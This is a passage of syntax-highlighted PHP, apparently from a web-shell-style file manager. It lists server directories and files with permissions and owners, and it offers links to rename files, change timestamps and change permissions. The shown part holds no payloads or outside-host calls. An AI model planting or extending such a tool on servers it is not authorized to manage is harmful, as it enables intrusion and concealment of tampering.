<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">filedata</span> = <span style="color: #ffffff; background-color: #002451;">GetSFileList(</span>$<span style="color: #ffeead;">nowpath</span>, $<span style="color: #ffeead;">findstr</span>, $<span style="color: #ffeead;">re</span>);
<span style="background-color: #003f8e;"> </span>   } <span style="color: #d1f1a9;">else</span> {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #7285b7; font-style: italic;">// </span><span style="color: #7285b7; font-style: italic;">&#30446;&#24405;&#21015;&#34920;</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #7285b7; font-style: italic;">//</span><span style="color: #7285b7; font-style: italic;">scandir()&#25928;&#29575;&#26356;&#39640;</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">dirs</span>=@<span style="color: #ffffff; background-color: #002451;">opendir(</span>$<span style="color: #ffeead;">dir</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">while</span> ($<span style="color: #ffeead;">file</span>=@<span style="color: #ffffff; background-color: #002451;">readdir(</span>$<span style="color: #ffeead;">dirs</span>)) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">filepath</span>=$<span style="color: #ffeead;">nowpath</span><span style="color: #ff9da4; font-weight: bold;">.</span>$<span style="color: #ffeead;">file</span>;
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span>(@<span style="color: #ffffff; background-color: #002451;">is_dir(</span>$<span style="color: #ffeead;">filepath</span>)){
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">dirdb</span>[<span style="color: #99ffff;">'filename'</span>]=$<span style="color: #ffeead;">file</span>;
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">dirdb</span>[<span style="color: #99ffff;">'mtime'</span>]=<span style="color: #d1f1a9;">@date</span>(<span style="color: #99ffff;">'Y-m-d H:i:s'</span>,<span style="color: #ffffff; background-color: #002451;">filemtime(</span>$<span style="color: #ffeead;">filepath</span>));
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">dirdb</span>[<span style="color: #99ffff;">'dirchmod'</span>]=<span style="color: #ffffff; background-color: #002451;">getChmod(</span>$<span style="color: #ffeead;">filepath</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">dirdb</span>[<span style="color: #99ffff;">'dirperm'</span>]=<span style="color: #ffffff; background-color: #002451;">getPerms(</span>$<span style="color: #ffeead;">filepath</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">dirdb</span>[<span style="color: #99ffff;">'fileowner'</span>]=<span style="color: #ffffff; background-color: #002451;">getUser(</span>$<span style="color: #ffeead;">filepath</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">dirdb</span>[<span style="color: #99ffff;">'dirlink'</span>]=$<span style="color: #ffeead;">nowpath</span>;
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">dirdb</span>[<span style="color: #99ffff;">'server_link'</span>]=$<span style="color: #ffeead;">filepath</span>;
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">dirdata</span>[]=$<span style="color: #ffeead;">dirdb</span>;
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   } <span style="color: #d1f1a9;">else</span> {<span style="color: #ff9da4; background-color: #003f8e;">        </span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">filedb</span>[<span style="color: #99ffff;">'filename'</span>]=$<span style="color: #ffeead;">file</span>;
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">filedb</span>[<span style="color: #99ffff;">'size'</span>]=<span style="color: #ffffff; background-color: #002451;">sizecount(</span>@<span style="color: #ffffff; background-color: #002451;">filesize(</span>$<span style="color: #ffeead;">filepath</span>));
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">filedb</span>[<span style="color: #99ffff;">'mtime'</span>]=<span style="color: #d1f1a9;">@date</span>(<span style="color: #99ffff;">'Y-m-d H:i:s'</span>,<span style="color: #ffffff; background-color: #002451;">filemtime(</span>$<span style="color: #ffeead;">filepath</span>));
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">filedb</span>[<span style="color: #99ffff;">'filechmod'</span>]=<span style="color: #ffffff; background-color: #002451;">getChmod(</span>$<span style="color: #ffeead;">filepath</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">filedb</span>[<span style="color: #99ffff;">'fileperm'</span>]=<span style="color: #ffffff; background-color: #002451;">getPerms(</span>$<span style="color: #ffeead;">filepath</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">filedb</span>[<span style="color: #99ffff;">'fileowner'</span>]=<span style="color: #ffffff; background-color: #002451;">getUser(</span>$<span style="color: #ffeead;">filepath</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">filedb</span>[<span style="color: #99ffff;">'dirlink'</span>]=$<span style="color: #ffeead;">nowpath</span>;
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">filedb</span>[<span style="color: #99ffff;">'server_link'</span>]=$<span style="color: #ffeead;">filepath</span>;
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">filedata</span>[]=$<span style="color: #ffeead;">filedb</span>;
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   }<span style="color: #7285b7; font-style: italic;">// </span><span style="color: #7285b7; font-style: italic;">while</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">unset(</span>$<span style="color: #ffeead;">dirdb</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">unset(</span>$<span style="color: #ffeead;">filedb</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   @<span style="color: #ffffff; background-color: #002451;">closedir(</span>$<span style="color: #ffeead;">dirs</span>);
<span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   @<span style="color: #ffffff; background-color: #002451;">sort(</span>$<span style="color: #ffeead;">dirdata</span>);
<span style="background-color: #003f8e;"> </span>   @<span style="color: #ffffff; background-color: #002451;">sort(</span>$<span style="color: #ffeead;">filedata</span>);
<span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">dir_i</span> = <span style="color: #99ffff;">'0'</span>;

<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;form id="filelist" name="filelist" action="'</span>.$<span style="color: #ffeead;">self</span>.<span style="color: #99ffff;">'" method="post"&gt;'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">makehide(</span><span style="color: #99ffff;">'action'</span>,<span style="color: #99ffff;">'file'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">makehide(</span><span style="color: #99ffff;">'thefile'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">makehide(</span><span style="color: #99ffff;">'doing'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">makehide(</span><span style="color: #99ffff;">'dir'</span>,$<span style="color: #ffeead;">nowpath</span>);

<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">foreach</span>($<span style="color: #ffeead;">dirdata</span> <span style="color: #d1f1a9;">as</span> $<span style="color: #ffeead;">key</span> =&gt; $<span style="color: #ffeead;">dirdb</span>){
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span>($<span style="color: #ffeead;">dirdb</span>[<span style="color: #99ffff;">'filename'</span>]!=<span style="color: #99ffff;">'..'</span> &amp;&amp; $<span style="color: #ffeead;">dirdb</span>[<span style="color: #99ffff;">'filename'</span>]!=<span style="color: #99ffff;">'.'</span>) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span>($<span style="color: #ffeead;">getdir</span> &amp;&amp; $<span style="color: #ffeead;">getdir</span> == $<span style="color: #ffeead;">dirdb</span>[<span style="color: #99ffff;">'server_link'</span>]) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">attachsize</span> = <span style="color: #ffffff; background-color: #002451;">dirsize(</span>$<span style="color: #ffeead;">dirdb</span>[<span style="color: #99ffff;">'server_link'</span>]);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">attachsize</span> = <span style="color: #ffffff; background-color: #002451;">is_numeric(</span>$<span style="color: #ffeead;">attachsize</span>) ? <span style="color: #ffffff; background-color: #002451;">sizecount(</span>$<span style="color: #ffeead;">attachsize</span>) :<span style="text-decoration: underline;"> </span><span style="color: #99ffff; text-decoration: underline;">'Unknown'</span><span style="text-decoration: underline;">;</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   } <span style="color: #d1f1a9;">else</span> {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">attachsize</span> = <span style="color: #99ffff;">'&lt;a href="javascript:getsize(\''</span>.$<span style="color: #ffeead;">dirdb</span>[<span style="color: #99ffff;">'server_li</span><span style="color: #99ffff; text-decoration: underline;">nk'</span><span style="text-decoration: underline;">].</span><span style="color: #99ffff; text-decoration: underline;">'\',\''</span><span style="text-decoration: underline;">.$</span><span style="color: #ffeead; text-decoration: underline;">dir</span><span style="text-decoration: underline;">.</span><span style="color: #99ffff; text-decoration: underline;">'\');"&gt;Stat&lt;/a&gt;'</span><span style="text-decoration: underline;">;</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">thisbg</span> = <span style="color: #ffffff; background-color: #002451;">bg(</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;tr class="'</span>.$<span style="color: #ffeead;">thisbg</span>.<span style="color: #99ffff;">'" onmouseover="this.className=\'focus\';" o</span><span style="color: #99ffff; text-decoration: underline;">nmouseout="this.className=\''</span><span style="text-decoration: underline;">.$</span><span style="color: #ffeead; text-decoration: underline;">thisbg</span><span style="text-decoration: underline;">.</span><span style="color: #99ffff; text-decoration: underline;">'\';"&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;td width="2%" nowrap&gt;&lt;input name="dl[]" type="checkbox" value="'</span><span style="text-decoration: underline;">.$</span><span style="color: #ffeead; text-decoration: underline;">dirdb</span><span style="text-decoration: underline;">[</span><span style="color: #99ffff; text-decoration: underline;">'server_link'</span><span style="text-decoration: underline;">].</span><span style="color: #99ffff; text-decoration: underline;">'"&gt;&lt;/td&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;td&gt;&lt;a href="javascript:godir(\''</span>.$<span style="color: #ffeead;">dirdb</span>[<span style="color: #99ffff;">'server_link'</span>].<span style="color: #99ffff;">'\');"&gt;'</span>.<span style="text-decoration: underline;">$</span><span style="color: #ffeead; text-decoration: underline;">dirdb</span><span style="text-decoration: underline;">[</span><span style="color: #99ffff; text-decoration: underline;">'filename'</span><span style="text-decoration: underline;">].</span><span style="color: #99ffff; text-decoration: underline;">'&lt;/a&gt;&lt;/td&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;td nowrap&gt;&lt;a href="javascript:opfile(\'newtime\',\''</span>.$<span style="color: #ffeead;">dirdb</span>[<span style="color: #99ffff;">'ser</span><span style="color: #99ffff; text-decoration: underline;">ver_link'</span><span style="text-decoration: underline;">].</span><span style="color: #99ffff; text-decoration: underline;">'\',\''</span><span style="text-decoration: underline;">.$</span><span style="color: #ffeead; text-decoration: underline;">dirdb</span><span style="text-decoration: underline;">[</span><span style="color: #99ffff; text-decoration: underline;">'dirlink'</span><span style="text-decoration: underline;">].</span><span style="color: #99ffff; text-decoration: underline;">'\');"&gt;'</span><span style="text-decoration: underline;">.$</span><span style="color: #ffeead; text-decoration: underline;">dirdb</span><span style="text-decoration: underline;">[</span><span style="color: #99ffff; text-decoration: underline;">'mtime'</span><span style="text-decoration: underline;">].</span><span style="color: #99ffff; text-decoration: underline;">'&lt;/a&gt;&lt;/td&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;td nowrap&gt;'</span>.$<span style="color: #ffeead;">attachsize</span>.<span style="color: #99ffff;">'&lt;/td&gt;'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;td nowrap&gt;'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;a href="javascript:fileperm(\''</span>.$<span style="color: #ffeead;">dirdb</span>[<span style="color: #99ffff;">'server_link'</span>].<span style="color: #99ffff;">'\');"&gt;'</span>.$<span style="color: #ffeead; text-decoration: underline;">dirdb</span><span style="text-decoration: underline;">[</span><span style="color: #99ffff; text-decoration: underline;">'dirchmod'</span><span style="text-decoration: underline;">].</span><span style="color: #99ffff; text-decoration: underline;">'&lt;/a&gt; / '</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;a href="javascript:fileperm(\''</span>.$<span style="color: #ffeead;">dirdb</span>[<span style="color: #99ffff;">'server_link'</span>].<span style="color: #99ffff;">'\');"&gt;'</span>.$<span style="color: #ffeead; text-decoration: underline;">dirdb</span><span style="text-decoration: underline;">[</span><span style="color: #99ffff; text-decoration: underline;">'dirperm'</span><span style="text-decoration: underline;">].</span><span style="color: #99ffff; text-decoration: underline;">'&lt;/a&gt;'</span><span style="text-decoration: underline;">.$</span><span style="color: #ffeead; text-decoration: underline;">dirdb</span><span style="text-decoration: underline;">[</span><span style="color: #99ffff; text-decoration: underline;">'fileowner'</span><span style="text-decoration: underline;">].</span><span style="color: #99ffff; text-decoration: underline;">'&lt;/td&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;td nowrap&gt;&lt;a href="javascript:rename(\''</span>.$<span style="color: #ffeead;">dirdb</span>[<span style="color: #99ffff;">'server_link'</span>].<span style="color: #99ffff;">'</span><span style="color: #99ffff; text-decoration: underline;">\');"&gt;Rename&lt;/a&gt;&lt;/td&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;/tr&gt;'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">dir_i</span>++;
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   } <span style="color: #d1f1a9;">else</span> {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span>($<span style="color: #ffeead;">dirdb</span>[<span style="color: #99ffff;">'filename'</span>]==<span style="color: #99ffff;">'..'</span>) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;tr class='</span>.<span style="color: #ffffff; background-color: #002451;">bg(</span>).<span style="color: #99ffff;">'&gt;'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;td align="center"&gt;-&lt;/td&gt;&lt;td nowrap colspan="5"&gt;&lt;a href="java</span><span style="color: #99ffff; text-decoration: underline;">script:godir(\''</span><span style="text-decoration: underline;">.</span><span style="color: #ffffff; background-color: #002451; text-decoration: underline;">getUpPath(</span><span style="text-decoration: underline;">$</span><span style="color: #ffeead; text-decoration: underline;">nowpath</span><span style="text-decoration: underline;">).</span><span style="color: #99ffff; text-decoration: underline;">'\');"&gt;Parent Directory&lt;/a&gt;&lt;/td&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;/tr&gt;'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   }

<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;tr bgcolor="#dddddd" stlye="border-top:1px solid #fff;border-bottom:1px </span><span style="color: #99ffff; text-decoration: underline;">solid #ddd;"&gt;&lt;td colspan="6" height="5"&gt;&lt;/td&gt;&lt;/tr&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">file_i</span> = <span style="color: #99ffff;">'0'</span>;

<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">foreach</span>($<span style="color: #ffeead;">filedata</span> <span style="color: #d1f1a9;">as</span> $<span style="color: #ffeead;">key</span> =&gt; $<span style="color: #ffeead;">filedb</span>){
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span>($<span style="color: #ffeead;">filedb</span>[<span style="color: #99ffff;">'filename'</span>]!=<span style="color: #99ffff;">'..'</span> &amp;&amp; $<span style="color: #ffeead;">filedb</span>[<span style="color: #99ffff;">'filename'</span>]!=<span style="color: #99ffff;">'.'</span>) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">fileurl</span> = <span style="color: #ffffff; background-color: #002451;">str_replace(</span>$<span style="color: #bbdaff;">_SERVER</span>[<span style="color: #99ffff;">"DOCUMENT_ROOT"</span>],<span style="color: #99ffff;">''</span>,$<span style="color: #ffeead;">filedb</span>[<span style="color: #99ffff;">'server_</span><span style="color: #99ffff; text-decoration: underline;">link'</span><span style="text-decoration: underline;">]);</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">thisbg</span> = <span style="color: #ffffff; background-color: #002451;">bg(</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;tr class="'</span>.$<span style="color: #ffeead;">thisbg</span>.<span style="color: #99ffff;">'" onmouseover="this.className=\'focus\';" o</span><span style="color: #99ffff; text-decoration: underline;">nmouseout="this.className=\''</span><span style="text-decoration: underline;">.$</span><span style="color: #ffeead; text-decoration: underline;">thisbg</span><span style="text-decoration: underline;">.</span><span style="color: #99ffff; text-decoration: underline;">'\';"&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;td width="2%" nowrap&gt;&lt;input name="dl[]" type="checkbox" value="'</span><span style="text-decoration: underline;">.$</span><span style="color: #ffeead; text-decoration: underline;">filedb</span><span style="text-decoration: underline;">[</span><span style="color: #99ffff; text-decoration: underline;">'server_link'</span><span style="text-decoration: underline;">].</span><span style="color: #99ffff; text-decoration: underline;">'"&gt;&lt;/td&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;td&gt;'</span>.((<span style="color: #ffffff; background-color: #002451;">strpos(</span>$<span style="color: #ffeead;">filedb</span>[<span style="color: #99ffff;">'server_link'</span>], $<span style="color: #bbdaff;">_SERVER</span>[<span style="color: #99ffff;">"DOCUMENT_ROOT"</span>])<span style="text-decoration: underline;"> !== </span><span style="color: #bbdaff; text-decoration: underline;">false</span><span style="text-decoration: underline;">) ? </span><span style="color: #99ffff; text-decoration: underline;">'&lt;a href="'</span><span style="text-decoration: underline;">.$</span><span style="color: #ffeead; text-decoration: underline;">fileurl</span><span style="text-decoration: underline;">.</span><span style="color: #99ffff; text-decoration: underline;">'" target="_blank"&gt;'</span><span style="text-decoration: underline;">.$</span><span style="color: #ffeead; text-decoration: underline;">filedb</span><span style="text-decoration: underline;">[</span><span style="color: #99ffff; text-decoration: underline;">'filename'</span><span style="text-decoration: underline;">].</span><span style="color: #99ffff; text-decoration: underline;">'&lt;/a&gt;'</span><span style="text-decoration: underline;"> : $</span><span style="color: #ffeead; text-decoration: underline;">filedb</span><span style="text-decoration: underline;">[</span><span style="color: #99ffff; text-decoration: underline;">'filename'</span><span style="text-decoration: underline;">]).</span><span style="color: #99ffff; text-decoration: underline;">'&lt;/td&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;td nowrap&gt;&lt;a href="javascript:opfile(\'newtime\',\''</span>.$<span style="color: #ffeead;">filedb</span>[<span style="color: #99ffff;">'se</span><span style="color: #99ffff; text-decoration: underline;">rver_link'</span><span style="text-decoration: underline;">].</span><span style="color: #99ffff; text-decoration: underline;">'\',\''</span><span style="text-decoration: underline;">.$</span><span style="color: #ffeead; text-decoration: underline;">filedb</span><span style="text-decoration: underline;">[</span><span style="color: #99ffff; text-decoration: underline;">'dirlink'</span><span style="text-decoration: underline;">].</span><span style="color: #99ffff; text-decoration: underline;">'\');"&gt;'</span><span style="text-decoration: underline;">.$</span><span style="color: #ffeead; text-decoration: underline;">filedb</span><span style="text-decoration: underline;">[</span><span style="color: #99ffff; text-decoration: underline;">'mtime'</span><span style="text-decoration: underline;">].</span><span style="color: #99ffff; text-decoration: underline;">'&lt;/a&gt;&lt;/td&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;td nowrap&gt;'</span>.$<span style="color: #ffeead;">filedb</span>[<span style="color: #99ffff;">'size'</span>].<span style="color: #99ffff;">'&lt;/td&gt;'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;td nowrap&gt;'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;a href="javascript:fileperm(\''</span>.$<span style="color: #ffeead;">filedb</span>[<span style="color: #99ffff;">'server_link'</span>].<span style="color: #99ffff;">'\');"&gt;'</span>.<span style="text-decoration: underline;">$</span><span style="color: #ffeead; text-decoration: underline;">filedb</span><span style="text-decoration: underline;">[</span><span style="color: #99ffff; text-decoration: underline;">'filechmod'</span><span style="text-decoration: underline;">].</span><span style="color: #99ffff; text-decoration: underline;">'&lt;/a&gt; / '</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;a href="javascript:fileperm(\''</span>.$<span style="color: #ffeead;">filedb</span>[<span style="color: #99ffff;">'server_link'</span>].<span style="color: #99ffff;">'\');"&gt;'</span>.<span style="text-decoration: underline;">$</span><span style="color: #ffeead; text-decoration: underline;">filedb</span><span style="text-decoration: underline;">[</span><span style="color: #99ffff; text-decoration: underline;">'fileperm'</span><span style="text-decoration: underline;">].</span><span style="color: #99ffff; text-decoration: underline;">'&lt;/a&gt;'</span><span style="text-decoration: underline;">.$</span><span style="color: #ffeead; text-decoration: underline;">filedb</span><span style="text-decoration: underline;">[</span><span style="color: #99ffff; text-decoration: underline;">'fileowner'</span><span style="text-decoration: underline;">].</span><span style="color: #99ffff; text-decoration: underline;">'&lt;/td&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;td nowrap&gt;'</span>);
